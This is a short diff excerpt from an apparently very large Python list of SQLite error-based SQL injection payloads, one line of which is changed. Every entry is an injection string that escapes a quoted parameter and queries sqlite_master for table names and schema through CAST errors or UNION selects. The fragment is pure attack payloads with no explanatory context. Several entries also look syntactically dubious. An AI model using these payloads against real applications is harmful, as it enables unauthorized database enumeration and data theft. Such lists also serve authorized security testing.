     "1' WHERE CAST((SELECT INSTR(sql,'CREATE') FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION ALL SELECT (SELECT CAST(ABS(rowid) AS TEXT) FROM sqlite_master LIMIT 1)--",
     "1' AND CAST((SELECT ROUND(rowid,-99) FROM sqlite_master LIMIT 1) AS INT)--",
@@ -167549,7 +167551,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' OR CAST((SELECT CASE type WHEN 'table' THEN name ELSE sql END FROM sqlite_master LIMIT 1) AS INT)--",
     "1' WHERE (SELECT CAST(CASE WHEN name IS NOT NULL THEN ROWID ELSE 0 END FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION SELECT CAST((SELECT UPPER(LOWER(name)) FROM sqlite_master LIMIT 1) AS INT)--",
-    "1' AND (SELECT CAST(REVERSE(sql) FROM sqlite_master LIMIT 1) AS INT)--",
+    "1' AND (SELECT CAST(SUBSTR(sql,LENGTH(sql),1) AS INT) FROM sqlite_master LIMIT 1)--",
     "1' OR CAST((SELECT TRIM(name) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' WHERE (SELECT CAST(LTRIM(RTRIM(sql)) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION ALL SELECT (SELECT CAST(REPLACE(UPPER(name),'A','B') FROM sqlite_master LIMIT 1) AS INT)--",
